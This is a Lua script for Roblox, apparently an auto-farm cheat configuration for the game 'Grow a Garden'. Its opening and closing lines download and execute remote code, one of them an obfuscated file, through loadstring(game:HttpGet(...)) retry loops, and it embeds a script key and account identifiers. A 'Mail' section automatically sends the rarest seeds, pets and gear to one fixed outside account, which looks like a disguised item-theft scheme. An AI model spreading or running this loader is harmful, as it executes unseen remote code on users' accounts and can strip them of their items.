_G.Config={UserID="a675440d-51e7-4396-a617-504754c4658e",discord_id="1206257142630195233",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/gag2"))()end)if s then break end wait(5)end
_G.GAGConfig = _G.GAGConfig or {
    ["Harvest"] = {
        ["Sell At"] = 80,
        ["Sell Every"] = 30,
        ["Only Harvest"] = {},
        ["Don't Harvest"] = {},
    },

    ["Planting"] = {
        ["Plant Plan"] = {},
        ["Layout"] = "compact",
        ["Don't Plant"] = {
            ["Dragon's Breath"] = true, 
            ["Moon Bloom"] = true,
			["Gold"] = true,
            ["Rainbow"] = true,
        },
        ["Keep Seeds"] = {
            ["Dragon's Breath"] = 1,
            ["Moon Bloom"] = 1,
            ["Gold"] = 1,
            ["Rainbow"] = 1,
        },
    },

    ["Money"] = {
        ["Keep Cash"] = 15000,
        ["Auto Expand Plot"] = false,
        ["Max Expansions"] = 3,
        ["Expand If Over"] = 1500000,
        ["Auto Replace Plants"] = true,
    },

    ["Never Sell"] = {
        ["By Mutation"] = {},
        ["By Fruit"] = {},
        ["Exact"] = {},
    },

    ["Pets"] = {
        ["Buy"] = {
            "Unicorn",
            "GoldenDragonfly",
            Deer = 6,
            Robin = 5,
            "Raccoon"
        },
        ["Equip"] = {
            Unicorn = 1,
            GoldenDragonfly = 1,
            Deer = 4
        },
        ["Auto Buy Slots"] = true,
        ["Max Pet Slots"] = 6,
    },

    ["Gear"] = {
        ["Auto Buy"] = true,
        ["Keep Cash"] = 15000,
        ["Sprinkler Coverage"] = "concentrate",
        ["Place Sprinklers"] = {
            ["best"] = 4
        },
        ["Best Sprinkler Up To"] = "Rare Sprinkler",
        ["Keep Gear"] = {
            ["Super Watering Can"] = 1,
            ["Legendary Sprinkler"] = 1,
            ["Super Sprinkler"] = 1,
        },
        ["Buy Gear"] = {},
    },

    ["Event Seeds"] = {
        ["Auto Claim"] = true,
    },

    ["Mail"] = {
        ["Auto Claim"] = true,
        ["Send To"] = "kkndesapenari33",
        ["Send"] = {
            "Moon Bloom",
            "Dragon's Breath",
            "Gold",
            "Rainbow",

            "GoldenDragonfly",
            "Unicorn",
            "Raccoon",

            "Super Sprinkler",
            "Super Watering Can",
            "Legendary Sprinkler",
    },
},

    ["Misc"] = {
        ["Auto Return To Garden"] = true,
        ["Show Stats"] = true,
        ["Smart Travel"] = true,
		["Auto Daily Deal"] = true,
		["Walk Speed"]   = 35,
		["Fast Travel"]  = false,
    },

    ["Performance"] = {
        ["FPS Cap"] = 10,
        ["Low Graphics"] = true,
        ["Remove Other Gardens"] = true,
        ["Hide Crop Visuals"] = true,
    },
}
script_key="7ECF8FC9340DD1F67092AC7E1E16CC04";
local s,r repeat s,r=pcall(function()return game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/roblog/refs/heads/main/gag-obfuscated.lua")end)wait(1)until s;loadstring(r)()
